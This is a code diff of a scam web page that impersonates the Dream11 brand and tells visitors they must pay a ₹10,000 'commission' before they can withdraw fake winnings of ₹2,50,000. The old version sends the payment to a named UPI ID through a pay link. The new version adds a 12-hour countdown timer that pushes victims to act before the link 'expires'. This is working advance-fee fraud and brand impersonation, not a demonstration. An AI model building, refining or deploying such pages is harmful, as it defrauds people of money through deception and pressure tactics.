@@ -3,107 +3,131 @@
 <head>
   <meta charset="UTF-8" />
   <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
-  <title>Payment Page - DRERMI</title>
+  <title>Withdrawal Page</title>
   <style>
-    * {
-      margin: 0;
-      padding: 0;
-      box-sizing: border-box;
-      font-family: 'Arial', sans-serif;
-    }
-
     body {
-      background-color: #e74c3c;
+      margin: 0;
+      font-family: Arial, sans-serif;
+      background-color: #d80000;
       display: flex;
       justify-content: center;
       align-items: center;
-      min-height: 100vh;
-      padding: 20px;
+      height: 100vh;
     }
 
     .container {
       background-color: white;
-      padding: 30px;
-      border-radius: 20px;
-      box-shadow: 0 8px 20px rgba(0, 0, 0, 0.2);
-      max-width: 450px;
-      width: 100%;
+      border-radius: 25px;
+      padding: 30px 20px;
+      width: 90%;
+      max-width: 400px;
       text-align: center;
+      box-shadow: 0 10px 25px rgba(0,0,0,0.2);
     }
 
-    .logo-img {
+    .logo {
       width: 80px;
       margin-bottom: 10px;
     }
 
-    .logo-text {
-      font-size: 24px;
-      color: #e74c3c;
+    .brand {
+      color: #d80000;
       font-weight: bold;
+      font-size: 20px;
       margin-bottom: 10px;
     }
 
-    .title {
-      font-size: 22px;
-      font-weight: bold;
-      margin-bottom: 25px;
-      color: #333;
-    }
-
-    .upi-id {
-      font-size: 18px;
-      color: #e74c3c;
-      font-weight: bold;
+    h2 {
       margin: 10px 0;
     }
 
     .amount {
-      font-size: 20px;
-      color: #2c3e50;
+      font-size: 28px;
       font-weight: bold;
-      margin: 10px 0;
+      color: green;
     }
 
-    .instruction {
-      font-size: 14px;
-      color: #555;
-      margin-bottom: 20px;
-      line-height: 1.5;
+    .info {
+      font-size: 15px;
+      margin: 15px 0;
     }
 
-    .pay-btn {
-      background-color: #27ae60;
-      color: white;
-      text-decoration: none;
+    .timer {
       font-weight: bold;
-      padding: 14px 25px;
-      border-radius: 10px;
-      display: inline-block;
+      color: red;
+      margin-top: 10px;
       font-size: 16px;
-      transition: background 0.3s;
     }
 
-    .pay-btn:hover {
-      background-color: #1e944f;
+    .btn {
+      margin-top: 20px;
+      padding: 12px 20px;
+      background-color: #28a745;
+      color: white;
+      border: none;
+      border-radius: 12px;
+      font-size: 16px;
+      cursor: pointer;
+    }
+
+    .btn:hover {
+      background-color: #218838;
+    }
+
+    .expired {
+      font-size: 18px;
+      font-weight: bold;
+      color: red;
+      margin-top: 20px;
     }
   </style>
 </head>
 <body>
   <div class="container">
-    <img src="1000076818.png" alt="Dream11 Logo" class="logo-img">
-    <div class="logo-text">DREAM11</div>
-    <div class="title">Complete Your Payment</div>
-    
-    <div class="instruction">
-      To withdraw your winnings, please pay the 10% commission amount using the UPI ID below.
-    </div>
-
-    <div class="upi-id">6005973034@ybl</div>
-    <div class="amount">Amount: ₹10,000</div>
-
-    <a href="upi://pay?pa=6005973034@ybl&pn=DRERMI%20Withdrawal&am=10000&cu=INR" class="pay-btn">
-      Pay Now via UPI
-    </a>
+    <img src="1000076818.png" alt="Dream11 Logo" class="logo" />
+    <div class="brand">DREAM11</div>
+    <h2>Withdrawal Page</h2>
+    <p>Your withdrawal amount is:</p>
+    <p class="amount">₹2,50,000</p>
+    <p class="info">You must pay ₹10,000 commission to proceed with withdrawal.</p>
+    <div class="timer" id="countdown">Time left: 12:00:00</div>
+    <button class="btn" id="withdrawBtn">Withdraw Now</button>
+    <div class="expired" id="expiredMsg" style="display:none;">Link Expired</div>
   </div>
+
+  <script>
+    const countdownElement = document.getElementById("countdown");
+    const withdrawBtn = document.getElementById("withdrawBtn");
+    const expiredMsg = document.getElementById("expiredMsg");
+
+    function startCountdown(duration) {
+      let endTime = localStorage.getItem("withdrawalExpiry");
+      if (!endTime) {
+        endTime = Date.now() + duration;
+        localStorage.setItem("withdrawalExpiry", endTime);
+      }
+
+      const interval = setInterval(() => {
+        const now = Date.now();
+        const distance = endTime - now;
+
+        if (distance <= 0) {
+          clearInterval(interval);
+          countdownElement.style.display = "none";
+          withdrawBtn.style.display = "none";
+          expiredMsg.style.display = "block";
+          return;
+        }
+
+        const hours = String(Math.floor(distance / (1000 * 60 * 60))).padStart(2, "0");
+        const minutes = String(Math.floor((distance % (1000 * 60 * 60)) / (1000 * 60))).padStart(2, "0");
+        const seconds = String(Math.floor((distance % (1000 * 60)) / 1000)).padStart(2, "0");
+
+        countdownElement.textContent = `Time left: ${hours}:${minutes}:${seconds}`;
+      }, 1000);
+    }
+
+    startCountdown(12 * 60 * 60 * 1000); // 12 hours
+  </script>
 </body>
 </html>
